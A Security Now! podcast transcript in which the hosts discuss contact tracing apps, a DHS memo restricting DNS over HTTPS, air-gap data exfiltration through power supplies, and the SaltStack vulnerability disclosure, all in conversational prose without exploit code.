STEVE:  Yeah, yeah, okay.  You know, I'm sorry, Job, but I tried.  He's with NTT, and we're going to be hearing his voice, anyone who's interested, because he's presenting a free RPKI 101 webinar.  And the good news it's a ways away, two weeks and two days.  On May 14th he, however you pronounce his name from NTT, will present a free webinar.  It's May 14th at 8:00 a.m. Pacific time.  And this guy is the real deal.  His short bio reads:  "Job Snijders" - however you pronounce his name - "is IP development engineer at NTT, where he analyzes and architects NTT's Global IP Network for future growth."  And of course NTT is a major player.  They're one of the big guys.  "He's been actively involved in the Internet community in an engineering and architectural capacity" - I almost said "archeological," but we're not that old yet - "architectural capacity as a frequent presenter at network operator events such as NANOG, ITNOG, DKNOG" - these NOGs all stand for Network Operator Group, by the way - "RIPE, NLNOG, and APRICOT, and in a number of community projects over 10 years.



"Job is co-chair of the IETF GROW working group, founder and director of the NLNOG Foundation, contributor to the OpenBSD project, and vice president of PeeringDB.  His special interests are routing policy, routing security, and large-scale BGP deployments.  He maintains several tools such as 'irrtree' and 'irrexplorer,' and is active in the IETF, where he has co-authored and contributed to RFCs and Internet Drafts."



And is that an understatement.  Let's see.  I have a list of them.  For example, he's the author, RFC 8327, "Mitigating the Negative Impact of Maintenance through BGP Session Culling"; the author, RFC 8212, "Default External BGP (EBGP) Route Propagation Behavior Without Policies"; the author of "BGP Administration Shutdown Communication"; the author of the RFC "The Use of BGP Large Communities"; the author of "Deprecation of BGP Path Attribute values 30, 31, 129, 241, 242, and 243."  Anyway, you get the point.  And he's like the author of another half dozen.  So if this interests you, this kind of BGP arcana, you can listen to him talk about RPKI two weeks and two days from now on May 14th at 8:00 a.m. Pacific time.  I'll be there.  Sounds like fun.



LEO:  Cool.  Is this one of those gotchas, though, where they're, you know, it's easy - we've seen a lot of these testers.  It's easy to say, oh, everybody should be doing this.  And then when it comes down to it it's like maybe a little bit hard to implement, or there's compelling reasons not to implement it, that kind of thing.



STEVE:  I don't think there's compelling reasons not to.  I do think it's probably difficult.  And, you know, especially in the middle of coronavirus where everybody seems to be rolling back everything that they were planning to do, this is probably not the time it's going to happen.  But, I mean, this looks like the only way to secure what we've got now.  As it happens, next week's topic is a deep dive into China's extremely controversial plan for a next-generation Internet.



LEO:  Oh.  I was wondering if you were going to cover this one.



STEVE:  Yup.



LEO:  This is the one with the kill switch.



STEVE:  That's right.  It changes many assumptions we have come to take for granted.  And I've got the documentation at the technical level, so we're going to do a deep dive into what China is planning.  It's probably never going to happen, but it'll be interesting to see, I mean, they're certainly big.



LEO:  Well, they presented it to the ITU.  I think they understand they can't just unilaterally do it unless they want to be cut off from the rest of the world.



STEVE:  Right.  Yeah, they're proposing it.  It's like, hey, how about this?



LEO:  What if we did this?  We've got this problem with dissidents and people we don't like publishing pictures of Winnie the Pooh, comparing it to President Xi.  We wish we could just flip a switch and turn those sites off.  How about it, guys?



STEVE:  That pesky freedom of expression; you know?



LEO:  I hate it when that happens.



STEVE:  When those packets come, and you don't know where they came from.



LEO:  Good, I can't wait.  I'm actually very interested.  I read about that a few weeks ago, and I was hoping you would.  See, as I'm browsing the Internet, I always go, oh, I hope Steve talks about that.  Oh, I'd like to know more about that.  I count on you, Steve.  You're the one who explains all this.  That's why we...



STEVE:  Leo, I have a feeling you're not alone.  And for that I really thank our listeners every week.



LEO:  Explainer in Chief, this guy right here.  You'll find Steve at his website, @SGgrc.  No, no, that's your Twitter handle, @SGgrc.  His website is just GRC.com.  You'll find all sorts of great stuff there, including 16Kb versions of the show, squinched heavily to fit into your briefcase.  There's also beautifully written transcripts by Elaine Farris so you can read along as you listen.  There's also 64Kb audio, if you have a bigger briefcase.  You can find audio and video at our website, TWiT.tv/sn.



When you're at GRC.com, though, do take a look at SpinRite.  Now would be a really good time to get in on SpinRite 6 so you can participate in the testing for the next generation, which as you heard is imminent.  That's exciting.



STEVE:  Well, and I've told people, if they want to make sure that the next SpinRite runs on what they have...



LEO:  Yeah, that's a good point.



STEVE:  ...then this is a way to do it.  Because if it doesn't, I'll make sure it does.



LEO:  Don't make promises you don't want to keep, Steve.  There's probably a few things, you know, I've got this disk pack, it's a 5MB IBM Bernoulli.



STEVE:  Well, actually we were recently just talking about Zip and Jaz drives and their operation.



LEO:  As long as there are sectors, right, you can read them.



STEVE:  Yeah.



LEO:  What else is there?  Oh, ShieldsUP!.  More Vitamin D info.  There's a ton of stuff there:  GRC.com.  That @SGgrc, I keep saying that, that's his Twitter.  And somebody was asking in the chatroom earlier, how do I email Steve?  I said, don't email Steve.  That's an exercise in futility.  You either go to GRC.com/feedback and leave a message there, or you tweet him.  He takes Direct Messages from anybody, crazy guy.  So you can leave a DM for Steve at @SGgrc on the Twitter.



We do this show every Tuesday, 1:30 Pacific, that's 4:30 Eastern, 20:30 UTC.  If you want to watch us do it live, TWiT.tv/live is the place.  There's audio and video streams there.  You can also ask your Amazon Echo, "Play TWiT Live on TuneIn," and it'll play.  I do that all day so I can listen all day and see what's going on.  It's kind of nice to have that in the background, especially as we're stuck at home.



Subscriptions to our podcasts are also welcome.  It helps us because it gives a more consistent number of downloads every week.  So all you have to do is find your favorite podcast app - Stitcher, Slacker, Pocket Casts, Overcast, Google Podcasts, Apple Podcasts, you know.  You know the drill.  Subscribe to Security Now!.  You also want every copy.  Even if you can't listen this week, you could listen to two next week.  It's always good to have them all.  One daisy chains to another.  Each show builds upon the knowledge gained from the previous show.  You need them all is my point.



Steve, I hope you have a wonderful week.  Enjoy - what is it you're going to watch?  "Devs" and...



STEVE:  "Devs" and "Under the Loop" or "Above the Loop" or something about the loop on Amazon Prime.  I will have reviews of those next week because...



LEO:  "Tales From the Loop."



STEVE:  "Tales From the Loop" is on Amazon Prime, available on Amazon Prime.  It looks great.  And you can speak to "Devs."  We were talking about a couple weeks ago.



LEO:  Yeah.  Couple of good sci-fi shows, worth watching.  All right, Steve.  Have a great week.



STEVE:  Okay, my friend.  Right-o.



LEO:  Talk to you next week.  Stay safe.



STEVE:  Bye.



Copyright (c) 2020 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#765

DATE:		May 5, 2020

TITLE:		An Authoritarian Internet?

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-765.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we add Bruce Schneier's thoughts about the theoretical feasibility of contact tracing apps.  We touch on our government's feelings about DNS over HTTPS.  We look at yet another wacky way of exfiltrating data from an air-gapped computer.  We examine a new vulnerability that has already damaged some large high-profile enterprise infrastructures.  We note Adobe's latest round of critical updates, another welcome service coming from Mozilla, a dispiriting bit of over-the-top political correctness from the U.K., and Google's plans to clean up the mess which is the Chrome Web Store.  We share a bit of errata, miscellany, and SpinRite news, then take a look at China's proposed changes to the fundamental operation of our global Internet.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  We'll talk about RDP scanning.  It's way up.  Bruce Schneier talks about why contact tracing apps are futile.  And we'll talk a little bit about SaltStack and a big security flaw for a lot of companies out there.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 765, recorded Tuesday, May 5th, 2020:  An Authoritarian Internet?



It's time for Security Now!, the show where we cover your privacy, your security, your safety online with this guy right here, Steve Gibson of GRC.com.



STEVE GIBSON:  Hi, Mom.



LEO:  His mom?  No.  Mom's watching from up there.  You might be saying hi to my mom.  I don't know if she watches this show.



STEVE:  Oh, I hope not.  No, that would...



LEO:  It's a little geeky.



STEVE:  It would do some damage.  So as promised, we're going to talk about China's proposal for how to fix the Internet.



LEO:  Yikes.



STEVE:  And thus as a consequence of some of the features of it - which maybe it's a little reactionary, but we'll let our listeners judge - I titled this "An Authoritarian Internet?"



LEO:  Oh, boy.  Yeah.



STEVE:  But it's got some interesting features.  But yeah, it's like, well, not going to happen.  But it is May 5th as we're recording this, Episode 765.  We've got a bunch of other stuff to talk about that I think will be interesting.  We're going to add Bruce Schneier's thoughts about the theoretical feasibility of contact tracing apps.  We touch on our own government's feelings about DNS over HTTPS.  We look at yet another wacky way - yes, another one - of exfiltrating data from an air-gapped computer, brought to us by the same guys who keep doing these things.



We examine a new vulnerability that has already damaged some large high-profile enterprise cloud infrastructures.  We note Adobe's latest round of critical updates that they dropped last Tuesday.  The news of another welcome service coming from Mozilla.  A dispiriting bit of over-the-top political correctness from the U.K.  And Google's plans to clean up the mess which is the Chrome Web Store.  We then share a bit of errata, some miscellany, and as I thought I was going to be able to promise, some SpinRite news.  Actually very welcome SpinRite news.



LEO:  Oh, that's exciting, yeah.



STEVE:  Yeah.  It was a good week.  And then we're going to take a look, as I said, at China's proposed changes to the fundamental operation of our global Internet.  So Security Now! 765 coming up.



LEO:  As usual, great big packet of informational stuff.  Steve?



STEVE:  So I didn't mention before that we have a little bit of a fun Picture of the Week.  This actually appeared.  This was a story in Spectrum.IEEE.org Tech Talk column on computing.  The headline of the story, dated April 10th:  "Cobol Programmers Answer the Call to Shore Up Unemployment Benefits Systems."  And the sub is:  "Retirees and newcomers want to help fix old software overloaded by new claims caused by the coronavirus pandemic."



So of course the problem is that some of these systems are, well, written in COBOL, and the population of people who are still fluent - I guess it's still actually around.  But anyway, they need more than they have.  So we've got old-timers coming out of retirement saying, yeah, I remember how to read that source code.  And they're coming back to I guess fix things that are broken and...



LEO:  That's hysterical.  I love it.  I love it.



STEVE:  ...crashing under the strain.  I just got a kick out of that.  Yes, we still need you, old-timers.  Somebody someone will need me to fix some assembly code somewhere, so I'll go, oh, yeah.



So Bruce Schneier decided to weigh in.  Of course we all know Bruce.  He's a well-known cryptography and privacy guy.  He blogged, and he begins his blog posting, which was titled "Me on COVID-19 Contract Tracing Apps," by writing, he starts:  "I was quoted in BuzzFeed."  And then he quotes himself being quoted.  BuzzFeed said, quoting him:  "'My problem with contact tracing apps is that they have absolutely no value,' Bruce Schneier, a privacy expert and fellow at the Berkman Klein Center for Internet & Society at Harvard University, told BuzzFeed News."  Again quoting:  "I'm not even talking about the privacy concerns; I mean the efficacy.  Does anybody think this will do something useful?"  He says:  "This is just something governments want to do for the hell of it.  To me, it's just techies doing techie things because they don't know what else to do."



Okay.  That was the quote from BuzzFeed.  Then he elaborated in his blog posting.  He says:  "I haven't blogged about this because I thought it was obvious.  But from the tweets and emails I have received, it seems not.  This is a classic identification problem, and efficacy depends on two things: false positives and false negatives."



So then he has two bullet points.  False positives first.  "False positives:  Any app will have a precise definition of a contact.  Let's say it's less than six feet for more than 10 minutes.  The false positive rate is the percentage of contacts that don't result in transmissions.  This will be because of several reasons.  One, the app's location and proximity systems, based on GPS and Bluetooth, just aren't accurate enough to capture every contact.  Two, the app won't be aware of any extenuating circumstances, like walls or partitions.  And three, not every contact results in transmission.  The disease has some transmission rate that's less than 100%."  And he says in parens:  "(And I don't know what that is)."



Then, for false negatives:  "This is the rate the app fails to register a contact when an infection occurs.  This will be because of several reasons.  One, errors in the app's location and proximity systems."  Which of course was the same as the first one.  "Two, transmissions that occur from people that don't have the app."  He says:  "Even Singapore didn't get above a 20% adoption rate for their app."  He says:  "And three, not every transmission is a result of that precisely defined contact."  He says:  "The virus sometimes travels further."  And of course we also know that it also can be transmitted through surface contact, not person-to-person.



Anyway, he said:  "Assume you take the app out grocery shopping with you, and it subsequently alerts you of a contact.  What should you do?  It's not accurate enough for you to quarantine yourself for two weeks.  And without ubiquitous, cheap, fast, and accurate testing, you can't confirm the app's diagnosis. So the alert," he says, "is useless.  Similarly, you take the app out grocery shopping, and it doesn't alert you of any contact.  Are you in the clear?  No.  You actually have no idea if you've been infected.  The end result is an app that doesn't work. People will post their bad experiences on social media, and people will read those posts and realize that the app is not to be trusted.  That loss of trust is even worse than having no app at all."



He says:  "It has nothing to do with privacy concerns.  The idea that contact tracing can be done with an app, and not human health professionals, is just plain dumb."  Okay.  And of course that's Bruce Schneier, who's Mr. Tech and crypto and so forth.  So that's how he ends his blog.



LEO:  And we've talked about this.  It doesn't have to be perfect.  We're trying to just bring the R-naught, the contagion rate below one; right?



STEVE:  Correct.



LEO:  So even if it was 50% reliable, it would have value; wouldn't it?  Or maybe I don't understand it.



STEVE:  Well, so for me the numbers out of New York are really fascinating because they're still in, I mean, they have been from the beginning in as stringent a lockdown as possible with Andrew Cuomo, the governor of New York State, spending an hour every day sort of as the father confessor, I mean, just like really urging people to stay at home, stay away from other people.  And with that they've only managed to get it barely below 1.0, which to me is fascinating.  I mean, just independent of what we would think.  In part of the state it's 0.8, they've calculated.  And I think in the north it's 0.9.  But, I mean, they're doing everything they can.  And the epidemiologists see that, and that's why what we're now hearing is everyone who's informed expects we're going to see a significant increase in cases about two weeks from now because this thing just wants to get transmitted.  I mean, it is trying to, hard.



Anyway, there was an interesting thing that he also said that I thought was interesting.  At the end of last week, Cuomo explained that the previous day - he was talking about their big project to ramp up human contact tracing; right?  So here's Bruce saying forget about the app, you need trained medical professionals.  So Cuomo is going to do this.  Bloomberg is stepping up, and he's organizing the project somehow.



So he said at the end of last week, he said that the previous day, which was last Thursday, the state identified 4,681 new, brand new cases of coronavirus, and that about the same would be happening again that same day, and pretty much every day.  He explained, I mean, and I was amazed he could do this with a straight face, he explained that effective contact tracing required that every one of those 4,681 people be interviewed to determine the identities of everyone they had come into physical proximity to over the past 14 days.  And then...



LEO:  They're going to telling people you've got to keep a journal of everywhere you go and what you do and who you see and who you meet for two weeks.



STEVE:  Well, and not just if you're infected, but everybody, because you never know...



LEO:  You don't know.



STEVE:  ...when you're going to suddenly be tested positive.



LEO:  Right.



STEVE:  And then all of those people, all of the people who the 4,681 people who tested positive on one day came in contact with for the previous 14 days, all of them need to be interviewed and perhaps placed into isolation, presumably interviewed and tested, and perhaps placed into isolation.  4,681 per day.  And then that expands, as I said, to all the people that they came in contact with.  And that has to happen every single day.  Does anyone believe...



LEO:  I heard Mike DeWine, the governor of Ohio, yesterday say, "Hey, we got 1,800 contact tracers.  We're in great shape."  I don't think that's going to do it.



STEVE:  I mean, no.  And in fact the most recent estimate is that we will need 300,000 human contact tracers.  So that'll be good for unemployment, but you'd have to train them up.  But the point is, Leo, 4,681 people in one state every single day then interviewed to determine everyone they may have had contact with for the previous two weeks, and then interview all of them.  It's not possible.  And so that's my point is that this thing has escaped.  It is out there.  And my feeling is it doesn't matter at all when we so call "reopen."  It's how we reopen that matters.  And from a standpoint of the damage we're doing to the economy, the sooner the better.



But as we were just talking, I guess it was before we began recording, about how you're out now in Petaluma, and people are not wearing face protection.  They're not covering their faces.  And so I'm of the opinion that we absolutely need to continue to be careful, but that you do as much commerce as you can while being as careful as you can be because this thing appears to be insistent upon finding people to infect.  If with New York doing everything they possibly can, they've barely managed to sneak it below an R-naught of one, then the moment they relax restrictions it will go above one.  And then we risk having this thing get away from us again.  I mean, it's a challenge.



So anyway, I thought it would be interesting to share Bruce's sentiments about software.  My feeling is it'll be fun to play with.  I'll install it, and I'm not worried about privacy concerns.  And if it goes off and sounds the alarm, it's like, oh, okay.  And the problem is it doesn't tell you who you got it from.  It just tells you sometime in the last two weeks somebody who tested positive was near enough to you that you exchanged Bluetooth tokens, and good luck to you.



LEO:  Yeah.  Well, this is why you want scientists and epidemiologists and physicians to make these decisions, not politicians or, with all due respect, podcasters.  This is crazy and tough, and I don't know what's going to happen.  I really don't.



STEVE:  Yeah.  I don't think I've posted the link.  There's a site that does a really good running three-day average.  As I said a long time ago, when I see people talk about the number of cases they've had, it's like, no, it's the number of cases you've identified.  And that's why, you know, very early on I said unfortunately, and ghoulish as this is, death is the only real count we have.  And I've been worried about India because they are late to the game, but they have a very dense population.  And anyway, the site that I've been following, I've looked at India, and it's just beginning to go exponential.  So the good news is they're late, so they've had the benefit of learning from the rest of the world that achieved critical mass of this virus months before.  So hopefully they will be able to keep it under control.  So interesting times we're in.



LEO:  No kidding.



STEVE:  Yeah.  So I said here "DHS's CISA says no to third-party DoH."



LEO:  All there. 



STEVE:  So we have abbreviation soup.  DHS is of course the U.S. Department of Homeland Security.  CISA is the Cybersecurity & Infrastructure Security Agency, which is an agency within the DHS.  And of course we all know that DoH is DNS over HTTPS.



In a recent four-page memorandum, the U.S. Department of Homeland Security reminded all federal CISOs, Chief Information Security Officers, that they must not use the DoH services which are coming to all our web browsers.  I have a link to the PDF of the memo which says:  "The purpose of this memorandum, issued pursuant to authorities under" - and I'm only going to read the introduction to it because it's a multipage memo.  Actually, I have two pieces of it.  But "...under section 3553(b) of Title 44, U.S. Code, and Title XXII of the Homeland Security Act of 2002, as amended, is to remind agencies of their legal requirements to use Einstein 3 Accelerated's Domain Name System" - that's Einstein 3A, as it's referred to henceforth - "the Domain Name System (DNS) sinkholing capability for DNS resolution, and to provide awareness about" - as the memo's intent - "to provide awareness about recent security and privacy enhancements to DNS resolution protocols, in particular DNS over HTTPS and DNS over TLS."



Okay.  So this Einstein 3 thing started off life as an intrusion detection system designed by the DHS's US-CERT.  Version 1 of Einstein allowed the agency to - and we're talking on a federal networking level - to monitor traffic across all government networks.  Version 2 of Einstein added the ability to spot suspicious traffic.  So they're doing intrusion monitoring.  And in Version 3, where we are today, with Einstein 3 Accelerated, went still further, preventing unwanted intrusions by known bad actors.  So, oh, it added filtering.  It offers useful DHS-specific services like sinkholing that override the public DNS records by blocking access to destinations that the DHS knows to be malicious.  So they're doing what a lot of us have already had, their commercial DNS services and so forth.



Anyway, it also lets the DHS examine all DNS requests made by government users.  And we know how useful that can be.  The memo notes that, they say:  "CISA encourages efforts to make network communications encrypted by default.  Doing so increases user security, making it harder for attackers to monitor and modify communications.  DoH and DoT add desirable security features to DNS resolution; however, federal agencies that use DNS resolvers other than E3A lose the protection that defensive DNS filtering provides, and E3A does not currently offer encrypted DNS resolution.  CISA intends to offer a DNS resolution service that supports DoH and DoT in time."  But not in time for this memo.  "Until then, agencies must use E3A for DNS resolution."



And then, finally:  "Required Action.  In accordance with 6 U.S.C. 663 note, 'Agency Responsibilities,' ensure local DNS recursive resolvers use E3A as their primary and ultimate upstream DNS resolvers."  In other words, we love DNS encryption, but not if we cannot monitor it for your own safety, of course; and not if we are unable to apply our spiffy Einstein DNS filtering bad domain sinkhole system to keep all you government workers from going to naughty places by mistake.  And, unfortunately, we don't currently offer DoH or DoT encryption of our value-added DNS, so be super sure to turn off that new on-by-default DoH resolution that Firefox and Google and soon Microsoft will all be using.  Or you're going to be in trouble. 



LEO:  Well, you can understand why; right?



STEVE:  Yeah, completely.



LEO:  They want to control it.  It's the same reason the British government called it, what is it, Public Enemy Number One or something.



STEVE:  That's right.



LEO:  Right?



STEVE:  Yes.  They want to control it.  They want to be able to look at it.  They recognize its value.  And of course the problem is, if somebody wasn't paying attention, Firefox will update, and Chrome will update.



LEO:  Right, and it's turned on by default.



STEVE:  And it's on by default.  And so suddenly their DNS server stops getting any requests.  And it's like, hey, wait a minute.  Where did everybody go?



LEO:  Aw.  Maybe that's why it took so long and still takes long for DNSSEC to penetrate.  People actually don't want DNS security.



STEVE:  It's a mixed blessing.



LEO:  Yeah.



STEVE:  So our somewhat nutty, but endlessly clever, guys at the Cyber Security Research Center of the Ben-Gurion University of the Negev in Israel, specifically this time a Dr. Mordechai Guri, have come up with yet another sneaky, if not entirely practical, means of exfiltrating an air-gapped computer's digital data by way of its switching power supply.



LEO:  Wow.



STEVE:  Mordechai's research - yup.



LEO:  Wow.



STEVE:  Mordechai's research has been published with the title "POWER-SUPPLaY:  Leaking Data from Air-Gapped Systems by Turning the Power Supplies into Speakers."  I'll just share the abstract because that gets enough of what they have done.  So he writes in his abstract:  "It is known that attackers can exfiltrate data from air-gapped computers through their speakers via sonic and ultrasonic waves.  To eliminate the threat of such acoustic covert channels in sensitive systems, audio hardware can be disabled, and the use of loudspeakers can be strictly forbidden. Such audio-less systems are considered to be audio-gapped, and hence immune to acoustic covert channels.



"In this paper, we introduce a technique that enables attackers to leak data acoustically from air-gapped and audio-gapped systems.  Our developed malware can exploit the computer power supply unit (PSU) to play sounds and use it" - I know.



LEO:  This is great.  I love it.  It's amazing.



STEVE:  "...as an out-of-band secondary speaker with limited capabilities.  The malicious code manipulates the internal switching frequency of the switching power supply and hence controls the sound waveforms generated from its capacitors and transformers."



LEO:  I've been telling you for years my power supply's been talking to me.



STEVE:  That's right.  It's making those little squeaky sounds.



LEO:  Hysterical.  That's hysterical.



STEVE:  "Our technique enables producing audio tones in a frequency band of 0-24kHz and playing audio streams, i.e., WAV files, from a computer power supply without the need for audio hardware or speakers.  Binary data - files, key logging, encryption keys, et cetera - can be modulated over the acoustic signals and sent to a nearby receiver, for example, a smartphone."



LEO:  I bet the bit rate's not super high.



STEVE:  Not high, but not bad.  "We show that our technique works with various types of systems:  PC workstations and servers, as well as embedded systems and IoT devices that have no audio hardware at all.  We provide technical background and discuss implementation details such as signal generation and data modulation.  We show that the POWER-SUPPLaY code can operate from an ordinary user-mode process and doesn't need any hardware access or special privileges.  Our evaluation shows that POWER-SUPPLaY sensitive data can be exfiltrated from air-gapped and audio-gapped systems from a distance of five meters at a maximum bit rate of 50 bits per second."



LEO:  Oh, well, that's pretty good.



STEVE:  That's not bad.  "We should remember that while no one is going to transfer anything massive from a computer at 50 bits per second, elliptic curves, which are coming into increasing use, provide their state-of-the-art security using only a 256-bit key which could be sent in five seconds. Since every bit of a key is critical, and no bits can be inferred from others, I would encode the burst transmission with ample error correction. That might add another 30% to its size, but only a couple of additional seconds for burst duration."



So what these guys do is they chose four different frequencies, and so they send two bits at a time using one of four frequencies, since one of four gives you two bits.  And that allows them enough time to set it up.  Essentially, they are drawing varying amounts of power.  And in a switching power supply, the power supply achieves its efficiency by changing the speed at which it switches power from the mains into its down-regulated DC, based on how much power is being drawn.  Draw more power, the switching rates increases in order to couple more power from the main side down into the DC converted side.  So, yes, you do get a shift in tone based on how much power is being drawn.



So these guys set up four different power levels, found four different discrete tones that would be generated, and then take two bits at a time from the data they want to send, use those two bits to choose one of four power draws.  The switching power supply changes its switching frequency.  A smartphone up to five meters away is able to detect that difference and essentially demodulate those two bits back to what they were before.



LEO:  Thomas Edison is saying, "I told you.  I told you.  DC's the only way."



STEVE:  Yup.  So we've had an authorization bypass in something known as SaltStack.  We've never had the occasion to touch on SaltStack before, but a serious security vulnerability in this widely used cloud resource management system changes that.  It lives over on GitHub, although there is a commercial enterprise that essentially is responsible for it and deploys it and maintains it.  It describes itself as:  "SaltStack makes software for complex systems management at scale.  SaltStack is the company that created and maintains the Salt Open project and develops and sells SaltStack Enterprise software, services, and support.  Easy enough to get running in minutes, scalable enough to manage tens of thousands of servers, and fast enough to communicate with them in seconds."



They said:  "Salt is a new approach to infrastructure management built on a dynamic communication bus.  Salt can be used for data-driven orchestration, remote execution for any infrastructure, configuration management for any app stack, and much more.  Salt Open is tested and packaged to run on CentOS, Debian, Red Hat Enterprise, Ubuntu, and Windows."



So the good news is we've never had the occasion to talk about it before.  The bad news is now we do.  F-Secure wrote that they discovered a number of vulnerabilities in the Salt management framework.  And the route of this is a little interesting.  So they explained, they said:  "The open source Salt project is at the heart of SaltStack the company's product offerings, but is also very popular as a configuration tool to manage servers in data centers and cloud environments."



They said:  "Salt is used to monitor and update the state of servers.  Each server runs an agent called" - and I love this - "a 'minion' which connects to a 'master,' a Salt installation that collects state reports from minions and publishes update messages that minions can act on," is the master.  "Typically," they wrote, "such messages are updates to the configuration of a selection of servers, but they can also be used to run the same command in parallel over multiple, even all, managed systems asynchronously."



So it's a communications infrastructure and layer with agents that run in cloud servers that connect to this master, and there's an established protocol that allows files to be transferred, commands to be issued and so forth.  So it's very powerful in terms of the manipulation and authority that it gives the master over a potentially massive infrastructure.  And so you can imagine security of this thing would be paramount.  F-Secure says the default communication protocol in Salt is known as ZeroMQ, Z-E-R-O-M-Q.  The master exposes two ZeroMQ instances, one called the "request server" where the minions can connect to report their status or the output of commands that they're given, and one called the "publish server" where the master publishes messages that the minions can connect and subscribe to.



"The vulnerabilities described in this advisory..." - and this was only recently published, I think it was late last week, yeah, like Friday.  This is F-Secure saying "...allow an attacker who can connect to the request server port to bypass all authentication and authorization controls and publish arbitrary control messages, read and write files anywhere on the master server file system, and steal the secret key used to authenticate to the master as root.  The impact is full remote command execution as root on both the master and all the minions that connect to it."



They said:  "The vulnerabilities, allocated CVE IDs" - and there's two of them - "are of two different classes, one being authentication bypass where functionality was unintentionally exposed to unauthenticated network clients, the other being directory traversal where untrusted input, for example parameters in network requests, was not being sanitized correctly, allowing unconstrained access to the entire filesystem of the master server."



And I'll just stop for a second to say, Leo, this directory traversal thing, I mean, it was very clever with the notion of a hierarchical directory tree.  I can't imagine how we would organize without it.  But maybe the problem is that the ../.. thing...



LEO:  It's terrible.  It's really terrible.



STEVE:  It's just been such a problem for us historically.



LEO:  Is this the same thing?  It's that dot dot again?



STEVE:  Yeah, it's the ../..; it just keeps biting us.



LEO:  It doesn't need to be hierarchical.  There has to be a better way to organize information.  Hierarchical is silly.  Isn't it?



STEVE:  I don't know.  I'm a big outliner.  I mean, I organize everything in outlines.



LEO:  You could use tags.  You could use other taxonomies.  Think of it as a database as opposed to an outline.  Right?



STEVE:  Yeah.  And so you use context in order to access instead of - yeah.



LEO:  I mean, I just think there's a better way.  We just do it because we've always done it that way.



STEVE:  Yeah.  And unfortunately ../.. allows you to go back up and then come down, descend down a different branch.



LEO:  Every time I type that, and I do it a lot because I do a lot of command line stuff in Linux, I just go, there's got to be a better way.  And most, by the way, most Linux shells have some shortcut method so you don't have to do that.  In many shells you just type the folder, and it just goes there.



STEVE:  Yeah, and often, because I'm still old school, I'll go wait a minute, ../../..?  Or do I want one more ../..?



LEO:  Right, yes, yes, it's cuckoo.



STEVE:  Did I go back far enough yet?



LEO:  It's cuckoo.



STEVE:  If not, I'll just kind of go, oh, that's probably enough.  And if not, then I go, okay, I got close.  And then I go back another layer or two.



LEO:  No, that's nuts.



STEVE:  Yeah.



LEO:  It's a form of weird skeuomorphism, is what it is, because we're so tied to this hierarchy of folders, folder within a folder.  But they're not within anything.  That's just so humans can kind of get it.  I don't know, I don't think it has to be an outline.  Maybe.



STEVE:  So in any event, we'll fix this after the podcast.



LEO:  Yes, shall we?  Oh, good.



STEVE:  Yeah.  "SaltStack engineers patched" - this is F-Secure - "patched these vulnerabilities in release 3000.2."  Hopefully these have not been sequentially numbered releases.  "And users of Salt are encouraged to make sure that their installs are configured to automatically pull updates from SaltStack's repository server" - nice that there is such a thing, that's cool.  And then anyway, so repo.saltstack.com.  A patch release for the previous major release version is also available, with version number 2019.2.4.



So anyway, I'm going to skip the rest of this.  Oh, except that to note - oh, yeah.  Actually, I can't.  They finish, saying:  "Adding network security controls that restrict access to the Salt master which listens on ports 4505 and 4506, being the defaults, to known minions" - that is restrict access so that only the known minions have access, or at least block the wider Internet - "would also be prudent as the authentication and authorization controls provided by Salt are not currently robust enough to be exposed to hostile networks."  In other words, this is on the Internet, and those ports were open, and there was, as soon as this became known, there was no authorization or authentication in place.



And they finish, saying:  "A scan revealed over 6,000 instances of this service exposed to the public Internet."  And remember, that's 6,000 masters that are probably managing relatively significant cloud infrastructures that all have lots of minions calling in to see, you know, for instructions.  So, I mean, it's just like you couldn't make a better botnet-y thing if you tried to.  And here it was just like, oh, yeah, whoops.  We have an authentication bypass.  Yeah.



Okay.  So I'm going to skip over the timeline except to say that there was a little bit of comedy here because they first - F-Secure first tried to notify SaltStack on March 12th.  They said in their timeline:  "2020-03-12:  The GPG key for the SaltStack security team published on SaltStack.com had expired in 2018, and a request for an updated key was sent."  The point being F-Secure needed a valid GPG key in order to securely transmit this horrific finding that they had to get into SaltStack's hands to say, guys, you've got a really serious problem here.  But the GPG key had expired in 2018.



Now, I guess it's a good thing that it had been since 2018, apparently, that anybody had tried to use the GPG key.  So they're not getting lots of security reports.  Or maybe people are not, you know, calling them up on the phone and saying, hey.  But F-Secure tried to, you know, did it the right way.  But oops.



So they requested a GPG key, waited four days until March 16th.  Repeated their request.  Finally got a re-signed key on the contact page so was able to send a full vulnerability report to the SaltStack security team.  Four days go by.  Nothing.  So they request confirmation of the receipt to the SaltStack security team.  Four days go by.  The SaltStack security team finally confirms receipt of the vulnerability report and that they are reviewing it.  Yeah, I hope so.



Next event is April 7th.  SaltStack asks if F-Secure has requested CVEs for the reported vulnerabilities, and F-Secure replies in the negative, recommending that SaltStack proceed to contact Mitre in order to reserve some CVE IDs.  Now, what, eight days go by.  F-Secure informs SaltStack that an Internet-wide scan - oh, by the way, guys - turned up over 6,000 publicly exposed Salt masters and expresses concern that these will be at risk of compromise when the vulnerabilities are disclosed.  Also F-Secure requests information on SaltStack's plan for distributing fixes.



Now I guess they've got SaltStack's attention because only in the next day SaltStack informs F-Secure that fixes are being tested and planned for release "early next week."  That's in quotes.  I guess that's exactly what they said.  F-Secure reiterates concerns over the number of Salt masters exposed to the public Internet and requests information about how SaltStack plans to communicate this release to their customers.  The point being, like, whispering would be good at this point.



Two days go by.  SaltStack says to F-Secure, informs them of their communication plans and requests the list of identified IP addresses that expose a Salt master to the public Internet.  I guess that's reasonable.  I mean, you could get your own, or you could ask the people who already have one.  What the heck.  As well as suggestions for alternative approaches to disclosure.  Oh, that's good, like we've never had something bad like this, this big, happen before.  That's good.  So how would you suggest we got about this?  That was on April 20th.



